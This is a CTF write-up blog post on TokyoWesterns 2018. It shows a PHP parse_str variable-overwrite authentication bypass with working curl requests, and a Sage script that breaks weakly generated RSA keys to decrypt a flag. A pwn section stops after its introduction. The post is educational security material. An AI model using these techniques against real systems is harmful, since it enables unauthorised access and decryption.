---
layout: post
title: Tokyo-Westerns-2018
category: Tokyo-Westerns-2018
---
# TokyoWesterns CTF 2018
Tokyo Westerns did a great job with their 4th annual CTF; all the challeneges were unqiue and challenging. Below are writeups for challenges I solved with my team during the CTF.

## SimpleAuth (Web)
For this challenge, we start out only given the following URI `http://simpleauth.chal.ctf.westerns.tokyo`.

Navigating to this page, we are presented with the following PHP source code:
```
<?php

require_once 'flag.php';

if (!empty($_SERVER['QUERY_STRING'])) {
   $query = $_SERVER['QUERY_STRING'];
   $res = parse_str($query);
   if (!empty($res['action'])){
       $action = $res['action'];
   }
}

if ($action === 'auth') {
   if (!empty($res['user'])) {
       $user = $res['user'];
   }
   if (!empty($res['pass'])) {
       $pass = $res['pass'];
   }

   if (!empty($user) && !empty($pass)) {
       $hashed_password = hash('md5', $user.$pass);
   }
   if (!empty($hashed_password) && $hashed_password === 'c019f6e5cd8aa0bbbcc6e994a54c757e') {
       echo $flag;
   }
   else {
       echo 'fail :(';
   }
}
else {
   highlight_file(__FILE__);
}
```
Reading through the code, we notice a few things. First, there's a file, `flag.php`, that appears to be credential locked. Second, the credentials can only be passed via query string parameters. Finally, the MD5 hash of our concatenated username/password must match the hardcoded one.

Since we're still new with PHP, we begin by verifying that we can hit the `echo 'fail :(';` line.
```
curl http://simpleauth.chal.ctf.westerns.tokyo\?action\=auth

fail :(
```

Great! Now to read the flag, we must provide a username and password such that the MD5 hash of their concatenation will yield `c019f6e5cd8aa0bbbcc6e994a54c757e`.

Initially, I thought that all I had to do was crack this hash, but that didn't seem quite right for a web challenge. I looked back at the code. Reading more documentation pages revealed that `$res = parse_str($query);` seemed vulnerable to arbitrary variable overwrite. Hosting my own page to test this locally revealed that we were correct!

```
<?php
$var = 'test';
parse_str($_SERVER['QUERY_STRING']);
echo $var;
?>
```

```
curl http://127.0.0.1/test.php

test
```

```
curl http://172.0.0.1/test.php?var=XXX

XXX
```

With a working PoC, we get the flag with the following:

```
curl http://simpleauth.chal.ctf.westerns.tokyo\?action\=auth\&hashed_password\=c019f6e5cd8aa0bbbcc6e994a54c757e

TWCTF{d0_n0t_use_parse_str_without_result_param}
```

## Load (Pwn)
```
host : pwn1.chal.ctf.westerns.tokyo
port : 34835
```
For this challenge, we're given a binary and host/port to connect to. Running the binary reveals that it is a load file service. Attempting to load our local `/etc/hosts` provides us with a surprising segmentation fault!



## Revolutional Secure Angou (Crypto)
For this challenge, we're given a zip file containing an RSA public key, the encrypted flag, and the `generator.rb` script used to generate the public key and encrypted flag.

```
require 'openssl'

e = 65537
while true
  p = OpenSSL::BN.generate_prime(1024, false)
  q = OpenSSL::BN.new(e).mod_inverse(p)
  next unless q.prime #continue generating p,q until q.prime evaluates to TRUE
  key = OpenSSL::PKey::RSA.new
  key.set_key(p.to_i * q.to_i, e, nil)
  File.write('publickey.pem', key.to_pem)
  File.binwrite('flag.encrypted', key.public_encrypt(File.binread('flag')))
  break
end
```

Let's first recall how RSA keys are generated:
- Two distinct primes, p and q, are chosen at random
- The modulus n, where n=pq, is then calculated
- An integer e, or _public exponent_, is chosen such that 1 < e < \lamba(n) and gcd(e,\lambda(n)) = 1, where \lambda is Carmichael's totient function
- The _private exponent_, d, is determined such that d ≡ e^-1 mod \lamba(n)

Once this is done, `e` and `n` are published as the public key while `d`, `p`, and `q` are kept secret.

Encrypting a message, m, with a public key (n,e) is simply done by computing c ≡ m(e) mod n. Thus, anyone who knows d can decrypt the message by computing `m ≡ c(d) mod n`.

However if d is not known, the only way of decrypting the message is to factor n into p and q and then use them to compute d. Since this is extremely hard if p and q are very large, we can consider the cryptosystem secure.

Back to the challenge - we immediately notice from the above code that only p is chosen at random; q is computed as the inverse mod of p, such that q ≡ e^(-1) mod p. Thus, q is completely determined from the value of p. We notice that the generator will continue to produce p,q pairs until both p and q are prime.

We will exploit the fact that q is nonrandom to produce the private exponent, d. We know that:
```
q ≡ e^(-1) mod p <=> qe ≡ 1 mod p
                 <=> qe = kp+1, for some integer k
                 <=> pqe = p(kp+1)
```
Thus we are left to solve the quadratic `kp^2 + p - n(e) = 0`, where `n=pq` is part of the public key we are given. Once we solve for p, we can calculate d:
```
d ≡ e^(-1) mod (p-1)(q-1)
```

Finally, we must brute force the value of `k`. We know that `k = qe-1/p`, where `qe` and `p` are odd. Since `k` in an integer and an even integer divided by an odd integer is even, we know that `k` must be even. Thus, we set `k=2` and brute force even values until we find one such that `p|q` and `p` are non trivial factors. Our solution below is written using Sage with Python libraries.

```
#!/usr/bin/env sage-python
from Crypto.PublicKey import RSA
from Crypto.Util.number import bytes_to_long, long_to_bytes

with open ('publickey.pem', 'r') as f:
    pubkey = RSA.importKey(f.read())

with open('flag.encrypted', 'r') as f:
    ciphertext = bytes_to_long(f.read())

var('p')
r = None
n = pubkey.n
e = pubkey.e
k = 2

while not r:
    eq = n * e - p * (k * p + 1)
    r = eq.roots(p, ring=ZZ)
    k += 2

# with p, we compute q and d
p = r[0][0]
q = n / p
d = inverse_mod(e, (p-1) * (q-1))

# Decrypt the flag
plaintext = power_mod(ciphertext, d, n)

# Discard junk at the beginning of the plaintext
print long_to_bytes(plaintext)[-48:]
```

    TWCTF{9c10a83c122a9adfe6586f498655016d3267f195}